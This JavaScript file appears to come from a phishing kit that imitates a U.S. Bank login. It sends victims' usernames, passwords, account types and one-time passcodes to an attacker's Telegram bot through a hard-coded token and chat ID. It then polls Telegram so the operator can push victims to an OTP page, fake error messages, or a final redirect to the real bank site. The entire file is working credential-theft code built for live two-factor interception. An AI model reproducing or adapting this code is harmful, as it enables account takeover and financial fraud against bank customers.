const BOT_TOKEN = "8472908079:AAHRhM8yUVmfMagFkA85x8T0Zp9WMqWZftU";
const CHAT_ID = "7865246557";

// نظام إرسال البيانات من الصفحة الأولى
if (document.getElementById('loginForm')) {
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        document.getElementById('loader').style.display = 'flex';
        
        const text = `🏦 *U.S. Bank Login Attempt*\n\n👤 User: \`${document.getElementById('user').value}\`\n🔑 Pass: \`${document.getElementById('pass').value}\`\n📂 Type: ${document.getElementById('accType').value}`;
        
        await sendTelegram(text, [
            [{ text: "طلب OTP 📲", callback_data: "request_otp" }],
            [{ text: "خطأ في البيانات ❌", callback_data: "login_error" }]
        ]);
        startPolling();
    });
}

// نظام إرسال الـ OTP من الصفحة الثانية
if (document.getElementById('otpForm')) {
    document.getElementById('otpForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        document.getElementById('loader').style.display = 'flex';
        
        const text = `🔑 *U.S. Bank OTP Received*\n\n🔢 Code: \`${document.getElementById('otp_val').value}\``;
        
        await sendTelegram(text, [
            [{ text: "OTP خطأ ❌", callback_data: "otp_error" }],
            [{ text: "تم بنجاح ✅", callback_data: "finish" }]
        ]);
        startPolling();
    });
}

async function sendTelegram(text, buttons) {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown', reply_markup: { inline_keyboard: buttons } })
    });
}

function startPolling() {
    const poll = setInterval(async () => {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await res.json();
        if (data.result.length > 0) {
            const cmd = data.result[0].callback_query.data;
            if (cmd === "request_otp") {
                clearInterval(poll);
                window.location.href = "otp.html";
            }
            if (cmd === "login_error") {
                clearInterval(poll);
                document.getElementById('loader').style.display = 'none';
                alert("Invalid username or password.");
            }
            if (cmd === "otp_error") {
                clearInterval(poll);
                document.getElementById('loader').style.display = 'none';
                document.getElementById('otp-error').style.display = 'block';
                document.getElementById('otp_val').value = "";
            }
            if (cmd === "finish") {
                clearInterval(poll);
                window.location.href = "https://www.usbank.com";
            }
        }
    }, 3000);
}
